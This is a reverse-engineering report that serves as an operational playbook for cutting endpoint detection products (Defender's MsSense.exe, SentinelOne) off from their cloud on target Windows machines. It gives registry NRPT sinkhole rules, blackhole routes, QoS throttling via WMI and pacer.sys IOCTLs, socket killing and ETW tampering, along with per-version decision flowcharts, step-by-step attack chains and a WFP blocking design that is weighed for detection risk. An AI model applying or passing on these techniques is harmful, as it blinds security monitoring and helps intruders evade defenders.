# QoS EDR Blocking — Deep Dive & Reverse Engineering Findings

**Status:** Research complete (2026-06-12)  
**Tools used:** IDA Pro (idalib MCP), live beacon testing, registry analysis  
**Binaries reversed:** `pacer.sys`, `eqossnap.dll`, `gptext.dll`  
**Techniques tested:** edrchoker_v2 (WMI), edrchoker_v3 (registry + ZAW), NRPT sinkhole  

---

## 1. The Problem This Document Answers

During testing, three questions emerged that existing documentation did not cover:

1. **Why does `edrchoker_v3` (registry-only) not enforce throttling on Windows 10/11** even when the IOCTL trigger succeeds?
2. **Why does `edrchoker_v2` (WMI) fail on Windows 7** with "cannot get object"?
3. **Why does Proxifier break all three blocking techniques** (NRPT sinkhole, null_route, edrchoker)?

Answering these required reversing three system DLLs/drivers with IDA Pro and understanding the two completely separate QoS enforcement stacks in Windows.

---

## 2. Windows QoS Architecture — Two Separate Systems

The most important discovery: Windows has **two independent QoS enforcement stacks** that share the same registry key but use different kernel drivers and different value formats. Most documentation conflates them.

```
┌─────────────────────────────────────────────────────────────────────┐
│           HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\             │
│                     (shared registry path)                           │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
            ┌──────────────┴──────────────┐
            │                             │
   ┌────────▼─────────┐         ┌────────▼──────────┐
   │  FORMAT v1.0     │         │  FORMAT v2.0       │
   │                  │         │                    │
   │  Application     │         │  AppName           │
   │    Name REG_SZ   │         │    REG_SZ          │
   │  Throttle Rate   │         │  ThrottleRate      │
   │    REG_SZ "8"    │         │    REG_QWORD 1     │
   │  Protocol "*"    │         │  Protocol          │
   │  Version "1.0"   │         │    REG_DWORD 3     │
   │                  │         │  Version "2.0"     │
   └────────┬─────────┘         └────────┬───────────┘
            │                            │
            ▼                            ▼
   ┌─────────────────┐         ┌──────────────────────┐
   │  PSCHED system  │         │  ENTERPRISE QoS      │
   │  (Old — NT 4+)  │         │  system (New — Win8+)│
   │                 │         │                      │
   │  pacer.sys      │         │  eqos.sys            │
   │  \Device\PSched │         │  \Device\eQoS        │
   │  \\.\PSCHED     │         │                      │
   └─────────────────┘         └──────────────────────┘
            │                            │
            ▼                            ▼
   QoS Policy Manager          Enterprise QoS CSE
   (user-mode service,         (gptext.dll ordinal 2)
    Win XP-Vista active,        ProcessEQoSPolicy
    Win 10/11 mostly dead)
```

**Critical implication:** Writing v1.0 format → only pacer.sys can use it. Writing v2.0 format → only eqos.sys can use it. They do NOT cross-read each other's formats. edrchoker_v3 wrote v2.0 format initially (wrong), then was corrected to v1.0, but the enforcement layer (QoS Policy Manager) is absent on Win 10/11.

---

## 3. Reverse Engineering: pacer.sys

**File:** `C:\Windows\System32\drivers\pacer.sys` (206 KB)  
**Role:** Old NT QoS Packet Scheduler — NDIS intermediate filter driver  
**Device:** `\Device\PSched` → accessible as `\\.\PSCHED` from userland  

### 3.1 IOCTL Dispatch Table (PcpDispatchIoctl)

| IOCTL Code | Handler | Function |
|---|---|---|
| `0x00128000` | `PcpIoctlAddFlow` | Add a TC flow (bandwidth params) |
| `0x00128004` | `PcpIoctlDeleteFlow` | Delete a TC flow |
| `0x00128008` | `PcpIoctlAddFilter` | Add a packet filter → flow mapping |
| `0x0012800C` | `PcpIoctlDeleteFilter` | Delete a filter |
| `0x00128010` | `PcpIoctlRegisterClient` | Register as TC API client |
| `0x00128014` | `PcpIoctlDeregisterClient` | Deregister TC client |
| `0x00128018` | `PcpIoctlEnumerateFlow` | List active flows |
| `0x0012801C` | `PcpIoctlModifyFlow` | Modify existing flow |
| **`0x00128050`** | **`PcpIoctlZawEvent`** | **ZAW event — policy reload signal** |

### 3.2 Key Finding: pacer.sys Does NOT Match by Process Name

The most important finding from reversing pacer.sys: **it knows nothing about process names**. It operates on:
- **TC Flows** — bandwidth specifications (`TC_GEN_FLOW`, `FLOWSPEC` structures)
- **TC Filters** — packet matching rules (source IP, destination IP, port, protocol)

Input buffer for `AddFlow` (IOCTL `0x00128000`) is a `TC_GEN_FLOW` structure (552+ bytes minimum), with `FLOWSPEC.PeakBandwidth` as the throttle field. There are no string fields for process names anywhere in the kernel driver.

**Process-name matching is done entirely in userland** by the "QoS Policy Manager" component, which:
1. Watches for process creation events
2. For each process whose name matches a v1.0 registry policy, enumerates its sockets
3. Calls `TcAddFlow` + `TcAddFilter` per socket to bind that socket to the throttled flow
4. On new connections from that process, calls the TC API again

### 3.3 IOCTL 0x128050 — PcpIoctlZawEvent (ZAW Event)

**ZAW** = Zero Administration Windows — Microsoft's enterprise management initiative from NT 4.0 era.

This IOCTL signals pacer.sys that Group Policy has changed. Pacer.sys acknowledges the IOCTL (returns success immediately). It does NOT re-read the registry itself — it only signals any running QoS Policy Manager service that it should re-read policies and call TC API to set up new flows.

This means:
- IOCTL 0x128050 succeeds → pacer.sys accepted the signal ✓
- But if no QoS Policy Manager is running to act on the signal → no enforcement ✗

---

## 4. Reverse Engineering: eqossnap.dll

**File:** `C:\Windows\System32\eqossnap.dll` (110 KB)  
**Common misconception:** Named "eqos" → assumed to be QoS enforcer  
**Reality:** Pure MMC snap-in UI for editing QoS policies in Group Policy Object Editor (`gpedit.msc`)

### 4.1 Exports

Only 4 exports: `DllCanUnloadNow`, `DllGetClassObject`, `DllRegisterServer`, `DllUnregisterServer` — standard COM in-process server, no enforcement logic.

### 4.2 What It Does

- `EQoSSnapinWritePolicyEntryToRegistry` — writes v1.0 format to registry when admin clicks Apply in MMC UI
- `CPolicyNode::InitializeReg` — reads registry back into the UI
- No `DeviceIoControl`, no `CreateFile`, no `traffic.dll`, no `\\.\Psched` reference anywhere

**Conclusion:** eqossnap.dll cannot be used as a trigger. It is read-only UI.

---

## 5. Reverse Engineering: gptext.dll

**File:** `C:\Windows\System32\gptext.dll` (53 KB)  
**Role:** Group Policy Client Side Extensions for multiple GP areas including both QoS systems

### 5.1 Exports

| Ordinal | Export Name | CSE GUID | Description |
|---|---|---|---|
| 1 | `ProcessConnectivityPlatformPolicy` | `{cdeafc3d...}` | TCP/IP + connectivity |
| **2** | **`ProcessEQoSPolicy`** | **`{FB2CA36D-0B40-4307-821B-A13B252DE56C}`** | **Enterprise QoS (eqos.sys)** |
| **3** | **`ProcessPSCHEDPolicy`** | **`{426031c0-0b47-4852-b0ca-ac3d37bfcb39}`** | **QoS Packet Scheduler (pacer.sys)** |
| 4 | `ProcessTCPIPPolicy` | `{fbf687e6...}` | Connectivity platform alias |
| 5 | `DllRegisterServer` | — | COM registration |
| 6 | `DllUnregisterServer` | — | COM unregistration |

### 5.2 ProcessPSCHEDPolicy (ordinal 3) — Full Analysis

**Entire function body — 37 instructions:**

```c
// gptext.dll!ProcessPSCHEDPolicy
// GUID: {426031c0-0b47-4852-b0ca-ac3d37bfcb39} = "QoS Packet Scheduler"
DWORD ProcessPSCHEDPolicy(WORD flags, void* token, HKEY hKeyRoot,
                           void* pGPO_deleted, void* pGPO_added, ...) {
    // Guard: if both GPO lists are NULL → immediate return 0 (no-op)
    if (!pGPO_deleted && !pGPO_added) return 0;

    HANDLE h = CreateFileW(
        L"\\\\.\\PSCHED",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);

    if (h == INVALID_HANDLE_VALUE) return 0;  // fail silently

    DWORD br = 0;
    DeviceIoControl(h, 0x00128050, NULL, 0, NULL, 0, &br, NULL);
    CloseHandle(h);
    return 0;
}
```

**Key findings:**
- Reads ZERO registry keys — no v1.0 policy parsing
- Sends NO policy data to pacer.sys — just the bare IOCTL signal
- No `traffic.dll`, no `TcAddFlow`, no `TcAddFilter` imports
- Works identically Windows XP through Windows 11
- Compatible with Win 7 (no WMI dependency)

**Why enforcement still doesn't happen on Win 10/11:** The CSE fires the ZAW signal. If the QoS Policy Manager service is running and monitoring, it picks up the signal, reads v1.0 registry format, and calls TC API. On Win 10/11, this service is effectively dormant — the signal is received by pacer.sys and ignored.

### 5.3 ProcessEQoSPolicy (ordinal 2) — Full Analysis

**Much larger function (931+ bytes):**

```c
// gptext.dll!ProcessEQoSPolicy  
// GUID: {FB2CA36D-0B40-4307-821B-A13B252DE56C} = "Enterprise QoS"
DWORD ProcessEQoSPolicy(...) {
    // Step 1: Open \Device\eQoS (NOT \Device\PSched)
    HANDLE h = EQoSOpenDriverHandle();  // NtCreateFile(L"\\Device\\eQoS", ...)
    if (FAILED) return Win32Error;  // ← FAILS HERE if eqos.sys not loaded

    // Step 2: Read HKLM\...\QoS\ subkeys (v2.0 format)
    //         Builds app-name translation table
    //         Converts "C:\path\app.exe" → NT path "\Device\HarddiskVolume3\..."
    EQoSBuildAppNameTranslationTable(hKey, &table, machine_or_user);

    // Step 3: Send translation table to eqos.sys
    NtDeviceIoControlFile(h, NULL, NULL, NULL, &iosb,
        0xC07FC000,           // IOCTL for eqos.sys
        &table, tableSize,
        NULL, 0);

    CloseHandle(h);
    return 0;
}
```

**Why "Windows failed to apply Enterprise QoS settings":**  
`EQoSOpenDriverHandle()` calls `NtCreateFile(L"\\Device\\eQoS", ...)`. If `eqos.sys` is not loaded, this returns `STATUS_OBJECT_NAME_NOT_FOUND` → function returns error immediately → gpupdate reports the warning. There is no fallback to pacer.sys.

**What is eqos.sys:** `\Device\eQoS` is the Enterprise QoS kernel driver, distinct from pacer.sys. It handles the v2.0 registry format. Not installed/running on consumer Windows (absent from Windows 10/11 Home and Pro in most configurations).

### 5.4 Registry Verification Command

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions" /s
```
- `{426031c0}` = "QoS Packet Scheduler" → `ProcessPSCHEDPolicy` → pacer.sys
- `{FB2CA36D}` = "Enterprise QoS" → `ProcessEQoSPolicy` → eqos.sys

---

## 6. edrchoker_v2 (WMI) — Mechanism Deep Dive

### 6.1 What It Does

```
edrchoker_v2 add "MsSense.exe"
      │
      ▼
CoInitializeEx + WbemLocator
      │
      ▼
Connect to ROOT\StandardCimv2
      │
      ▼
SpawnInstance MSFT_NetQosPolicySettingData
      │
      ├── Name = "random8chars"
      ├── AppPathNameMatchCondition = "MsSense.exe"
      └── ThrottleRateAction = "8"  (VT_BSTR string, 8 bps)
      │
      ▼
PutInstance(ActiveStore)
      │
      ▼
WMI provider stores in GPO:localhost (WMI repository)
Writes v2.0 format to HKLM\...\QoS\<name>
Notifies enforcement engine via internal mechanism
      │
      ▼
pacer.sys (via TC API, per-socket) → throttle active
```

### 6.2 Why It Works When It Works

The WMI provider for `MSFT_NetQosPolicySettingData` (on Win 10/11) acts as the userland QoS Policy Manager: it monitors process creation, and when a process matching `AppPathNameMatchCondition` creates a socket, it calls `TcAddFlow` + `TcAddFilter` on `\\.\PSCHED` directly via the TC API — the same TC API that pacer.sys exposes through IOCTL `0x128000`/`0x128008`.

**Requirement:** `Psched` (pacer.sys) must be `STATE: 4 RUNNING`. If pacer.sys is in `STOP_PENDING` or stopped, the TC API calls fail silently and no throttling occurs.

### 6.3 Why It Fails on Windows 7

`MSFT_NetQosPolicySettingData` is a WMI class introduced in **Windows 8 / Server 2012** as part of the Network QoS PowerShell module. On Windows 7, the class does not exist in `ROOT\StandardCimv2`. The BOF call to `GetObject(L"MSFT_NetQosPolicySettingData")` returns `WBEM_E_NOT_FOUND (0x80041002)` — the "cannot get object" error the user reported.

**Windows 7 QoS stack:**
- Has pacer.sys (Psched) — RUNNING
- Has QoS Policy Manager service — more active than Win 10/11
- Does NOT have `MSFT_NetQosPolicySettingData`
- Does NOT have eqos.sys
- Uses v1.0 registry format + ZAW event (IOCTL 0x128050)

---

## 7. edrchoker_v3 (Registry) — Why It Doesn't Enforce on Win 10/11

### 7.1 Timeline of Format Changes

During testing, edrchoker_v3 went through two incorrect versions before reaching the correct design:

**Version 3a (wrong — v1.0 format, no trigger):**
- Wrote `Application Name`, `Throttle Rate` as REG_SZ — correct format for pacer.sys
- No trigger sent → pacer.sys never re-read registry → no enforcement
- `gpupdate /force` was suggested as trigger → caused "Enterprise QoS" warning (unrelated, from ProcessEQoSPolicy failing because eqos.sys absent)

**Version 3b (wrong — v2.0 format, wrong driver):**
- Changed to `AppName`, `ThrottleRate QWORD 1` — this is eqos.sys format
- IOCTL 0x128050 sent to pacer.sys (wrong — eqos.sys uses 0xC07FC000)
- pacer.sys received signal but has no knowledge of v2.0 format → no enforcement

**Version 3c (correct — v1.0 format + ZAW trigger):**
- Writes `Application Name`, `Throttle Rate = "8"` (v1.0 format)
- Sends IOCTL 0x128050 to `\\.\PSCHED` → signal delivered
- BUT on Win 10/11: no active QoS Policy Manager to act on the signal → no per-socket TC flows set up → 4040.exe still connects normally

### 7.2 The Missing Component

```
Win 10/11 — What Actually Happens:

edrchoker_v3 writes registry (v1.0) ────────────────────────┐
edrchoker_v3 sends IOCTL 0x128050 to pacer.sys ────────────►│
                                                              │
pacer.sys: "ZAW event received, acknowledged" ◄──────────────┘
pacer.sys: "Is anyone listening for this?" ──────► nobody ✗

QoS Policy Manager service: NOT RUNNING on Win 10/11
                                         ↓
                               No per-socket TC flow setup
                                         ↓
                               4040.exe connects normally
```

```
Win 10/11 — What edrchoker_v2 Does:

WMI PutInstance(MSFT_NetQosPolicySettingData) ──────────────►│
WMI provider receives policy ◄──────────────────────────────│
WMI provider monitors 4040.exe socket creation               │
4040.exe creates socket → provider calls:                    │
  TcAddFlow(\\.\PSCHED, PeakBandwidth=1_byte_per_sec)        │
  TcAddFilter(\\.\PSCHED, srcSocket=4040.exe's socket)       │
pacer.sys: enforces 1 byte/sec on that specific socket ✓     │
```

### 7.3 Windows 7 Compatibility Assessment

On Windows 7, the "QoS Policy Manager" is more active. The Psched service registration includes a user-mode component that:
1. Receives the ZAW event via SCM notification
2. Reads v1.0 format from `HKLM\...\QoS\`
3. Calls TC API per socket for matching processes

**Assessment:** edrchoker_v3 (v1.0 format + IOCTL 0x128050) **may work on Windows 7** — but requires empirical testing. The signal chain exists. Whether the Win 7 Psched service component is active enough to honor it depends on the specific machine configuration.

edrchoker_v2 (WMI) **does NOT work on Windows 7** — the `MSFT_NetQosPolicySettingData` class is absent.

| Technique | Win 7 | Win 8/8.1 | Win 10 | Win 11 |
|---|---|---|---|---|
| edrchoker_v2 (WMI) | ✗ no WMI class | ✓ | ✓ (Psched running) | ✓ (Psched running) |
| edrchoker_v3 (reg + ZAW) | ? (may work) | ? | ✗ no Policy Manager | ✗ no Policy Manager |
| WFP block | ✓ | ✓ | ✓ | ✓ |

---

## 8. NRPT Sinkhole — Mechanism & Proxifier Failure

### 8.1 How NRPT Works

```
Application DNS query for "evil.sentinelone.net"
      │
      ▼
Windows DNS Client service (svchost/dnscache)
      │
      ▼  ← WE INJECT HERE
  NRPT evaluation (HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig\)
      │
      ├── Rule: *.sentinelone.net → DNSServer = 127.0.0.2
      │          ConfigOptions = 8 (GenericDNSServer)
      │
      ▼
  Query forwarded to 127.0.0.2 (loopback, nothing listening)
      │
      ▼
  Query times out → SERVFAIL returned to application
      │
      ▼
  EDR cannot resolve cloud hostname → TLS connection never starts ✓
```

**Registry structure per rule:**
```
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig\edrchoker_XXXXXXXX\
    Name          REG_MULTI_SZ   "*.sentinelone.net\0\0"
    Version       REG_DWORD      2
    ConfigOptions REG_DWORD      8
    DNSServers    REG_SZ         "127.0.0.2"
```

**Activation:** `DnsFlushResolverCache()` called immediately after install — rules active without DNS TTL wait.

### 8.2 Why Proxifier Breaks NRPT

Proxifier is a network proxy tool that intercepts all TCP/UDP traffic at the WFP or LSP layer. It has its **own DNS resolver** that sends DNS queries directly through the configured proxy server, completely bypassing the Windows DNS Client service (`dnscache`).

```
Normal DNS flow:
  App → dnscache → NRPT rule applied → 127.0.0.2 (SERVFAIL) ✓

Proxifier DNS flow:
  App → Proxifier driver → proxy_server:1080/5353 → real DNS server → resolves ✗
                    ↑
          dnscache never consulted
          NRPT never evaluated
```

### 8.3 Why null_route Breaks With Proxifier

When null_route adds a `/32` blackhole route for EDR cloud IPs:
```
route add 52.168.117.120/32 0.0.0.0  (blackhole)
```

Normal traffic: EDR process → tcpip.sys routing table → 52.168.117.120 → blackholed ✓

With Proxifier:
```
EDR process → Proxifier → proxy_server_ip:1080 → [proxy routes to 52.168.117.120]
                   ↑
     Packet leaves as destination = proxy_server_ip
     Routing table never sees 52.168.117.120
     null_route has no effect ✗
```

### 8.4 Why edrchoker May Not Work With Proxifier

pacer.sys matches by the **socket owner's process name**. Proxifier intercepts the EDR's socket via TDI/WFP hooks and may own the forwarding socket itself:

```
Without Proxifier:
  MsSense.exe creates socket → pacer.sys sees socket owner = "MsSense.exe" → throttle ✓

With Proxifier:
  MsSense.exe creates socket → Proxifier intercepts → Proxifier.exe creates forwarding socket
                                                              ↑
                               pacer.sys sees owner = "Proxifier.exe" → no policy match ✗
```

Alternatively: the EDR may use CONNECT-tunneling through Proxifier where the EDR socket still exists but traffic is wrapped. In this case pacer.sys may throttle MsSense.exe's socket but the actual data goes through Proxifier's tunneling which has a much larger buffer, making 8 bps throttle ineffective.

### 8.5 Fix When Target Uses Proxifier

```
# Step 1: Find what proxy Proxifier is using
shell netstat -anob | findstr ESTABLISHED | findstr Proxifier
shell type "%APPDATA%\Proxifier\Proxifier.ini"

# Step 2: null_route the proxy server IP
route add <proxy_ip>/32 0.0.0.0

# Step 3: Throttle Proxifier process too
edrchoker_v2 add "Proxifier.exe;Proxifier64.exe;ProxifierPE.exe"

# Step 4: Kill existing Proxifier connections (if non-PPL)
sock_kill kill Proxifier.exe
```

When the proxy server IP is null_routed, ALL traffic through Proxifier dies — including EDR traffic. This is more aggressive (kills all proxied connections) but guarantees EDR cannot route around the block.

---

## 9. Complete Technique Matrix

### 9.1 Per-Windows-Version Decision Matrix

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    TARGET MACHINE ANALYSIS FLOWCHART                        │
└─────────────────────────────────────────────────────────────────────────────┘

sc query Psched
     │
     ├─ RUNNING ──────────────────────────────────┐
     │                                             │
     │   What Windows version?                     │
     │         │                                   │
     │    Win 7 / 2008 R2                         Win 10/11/2016+
     │         │                                   │
     │    edrchoker_v3                             edrchoker_v2
     │    (v1.0 reg + ZAW)                        (WMI, immediate)
     │    may work; test it                        ✓ confirmed working
     │                                             │
     │                                        Also add v3 registry
     │                                        for persistence after reboot
     │
     ├─ STOP_PENDING ──────────────────────────────────────────────────────┐
     │                                                                      │
     │   Cannot be fixed from userland. REBOOT required.                   │
     │   After reboot: Psched starts clean → use flow above                │
     │                                                                      │
     └─ NOT FOUND / STOPPED ───────────────────────────────────────────────┘
         │
         QoS approach will not work.
         Use WFP block filter instead.

sc query eqos
     │
     ├─ RUNNING ──────────────────────────────────┐
     │                                             │
     │   edrchoker_v3 (v2.0 format) + gpupdate     │
     │   OR call ProcessEQoSPolicy directly        │
     │   (call gptext.dll ordinal 2)               │
     │                                             │
     └─ NOT FOUND / STOPPED ───────────────────────┘
         Enterprise QoS approach unavailable.
         "Windows failed to apply Enterprise QoS settings" in gpupdate.
```

### 9.2 Technique Comparison Table

| Technique | Immediate | Persistent | Win 7 | Win 10/11 | EDR restart survives | Psched needed | eqos.sys needed |
|---|---|---|---|---|---|---|---|
| edrchoker_v2 (WMI) | ✓ | ? (GPO:localhost) | ✗ | ✓ | ✗ | ✓ | ✗ |
| edrchoker_v3 v1.0 + ZAW | ? (maybe Win7) | ✓ (reboot) | ? | ✗ | ✓ | ✓ | ✗ |
| edrchoker_v3 v2.0 + eqos | ✓ (if eqos runs) | ✓ | ✗ | ✗ (eqos absent) | ✓ | ✗ | ✓ |
| NRPT sinkhole | ✓ | ✓ (reboot) | ✓ | ✓ | ✓ | ✗ | ✗ |
| null_route | ✓ | ✗ (reboot clears) | ✓ | ✓ | ✓ | ✗ | ✗ |
| WFP block filter | ✓ | ✓ (sublayer) | ✓ | ✓ | ✗ (process path) | ✗ | ✗ |
| sock_kill | ✓ (one-shot) | ✗ | ✓ | ✓ | ✗ | ✗ | ✗ |

### 9.3 Best Chain by Scenario

**Scenario A: Win 10/11, Psched RUNNING, standard networking**
```
1. etw_tamper                              (blind EDR sensors first)
2. nrpt_sinkhole *.edr-domains.com         (DNS kill)
3. null_route <edr_cloud_ip>/32            (IP kill for cached connections)
4. edrchoker_v2 add "MsSense.exe"          (throttle remaining TLS)
5. edrchoker_v3 add "MsSense.exe"          (persistence backup for reboot)
6. sock_kill kill MsSense.exe              (kill existing connections, non-PPL only)
```

**Scenario B: Win 7, standard networking**
```
1. etw_tamper
2. nrpt_sinkhole *.edr-domains.com
3. null_route <edr_cloud_ip>/32
4. edrchoker_v3 add "MsSense.exe"          (v2 won't work on Win7)
   → verify: edrchoker_v3 list
   → test: ping <edr_cloud_ip> (should be slow or timeout from process)
```

**Scenario C: Target uses Proxifier**
```
1. Find proxy server IP from Proxifier config
2. null_route <proxy_server_ip>/32         (kill the tunnel)
3. edrchoker_v2 add "Proxifier.exe"        (throttle proxy client)
4. sock_kill kill Proxifier.exe            (RST existing tunnels)
5. THEN apply normal EDR blocking chain
```

**Scenario D: Psched STOP_PENDING (emergency)**
```
1. edrchoker_v3 add "MsSense.exe"          (write to registry for after reboot)
2. nrpt_sinkhole *.edr-domains.com         (works regardless of Psched)
3. null_route <edr_cloud_ip>/32            (works regardless of Psched)
4. sock_kill kill MsSense.exe              (one-shot, kills current connections)
5. [wait for reboot or reboot target]
   → After reboot: Psched RUNNING → edrchoker_v3 v1.0 ZAW activates
```

---

## 10. Diagnostic Commands

### 10.1 Determine Which QoS Stack Is Active

```batch
rem Check pacer.sys (old stack)
sc query Psched
sc qc Psched

rem Check eqos.sys (new stack)  
sc query eqos

rem Check what's actually in WMI
powershell -c "Get-NetQosPolicy -PolicyStore ActiveStore"

rem Check registry — which formats are written
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS" /s

rem Verify CSE registrations
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions\{426031c0-0b47-4852-b0ca-ac3d37bfcb39}"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions\{FB2CA36D-0B40-4307-821B-A13B252DE56C}"
```

### 10.2 Verify Throttle Is Active

```batch
rem From the throttled process context — if this is slow, throttle works
ping 8.8.8.8 -n 3

rem From another process — check Psched state
edrchoker_v2 check

rem Check event log for Enterprise QoS failures
wevtutil qe "Microsoft-Windows-GroupPolicy/Operational" /c:10 /rd:true /f:text
```

### 10.3 Quick Health Check for edrchoker Operations

```
edrchoker_v2 check    → Psched state + NetQosSvc + active WMI policies
edrchoker_v3 list     → active v1.0 registry policies
```

---

## 11. Recommended Next Step: WFP Block Filter BOF

The fundamental limitation of all QoS-based approaches: they require either:
- An active userland monitoring component (WMI provider / QoS Policy Manager)
- Or a reboot for persistence to activate

**WFP (Windows Filtering Platform)** bypasses all of this:
- Operates at ALE (Application Layer Enforcement) kernel layer
- Matches by `FWPM_CONDITION_ALE_APP_ID` (process NT path)
- **Blocks completely** (not just throttles) — no handshake can start
- No Psched, no eqos.sys, no QoS Policy Manager needed
- Immediate — no reboot, no gpupdate, no WMI
- Works Windows 7 through Windows 11

```c
// Concept for wfp_filter_block.bof.c
// 1. FwpmEngineOpen0        → open WFP engine
// 2. FwpmSubLayerAdd0       → create persistent sublayer
// 3. FwpmGetAppIdFromFileName0 → convert process path to FWP_BYTE_BLOB
// 4. FwpmFilterAdd0         → add BLOCK filter on FWPM_LAYER_ALE_AUTH_CONNECT_V4
//    Condition: FWPM_CONDITION_ALE_APP_ID == app_id_blob
//    Action: FWP_ACTION_BLOCK
// Same for _V6 layer
```

**Limitation vs QoS throttling:** WFP block is harder to detect via behavioral analysis (generates WFP event 5157 on blocked connections, but NOT 5447 which is for filter changes). Detection risk depends on whether the target has WFP event monitoring.

---

## 12. Session Log — What Changed

| Time | Finding | Impact |
|---|---|---|
| Start | edrchoker_v3 writes v1.0 format, no trigger | No effect |
| IDA: pacer.sys | Found IOCTL 0x128050 ZawEvent, device \\.\PSCHED | Identified trigger |
| IDA: eqossnap.dll | Confirmed it is MMC UI only, no enforcement | Eliminated false lead |
| IDA: gptext.dll | Found two separate paths: eqos.sys vs pacer.sys | Root cause of gpupdate failure |
| Registry check | `eqos` service not installed on consumer Win 10/11 | Explains v2.0 format failure |
| v3 format fix | Reverted to v1.0 format + added ZAW IOCTL trigger | Correct trigger implemented |
| Live test | ZAW event received, 4040.exe still connects | Confirmed QoS Policy Manager absent |
| Conclusion | Win 10/11 needs WMI (v2) or WFP; v3 works on Win7 only | Architecture determined |
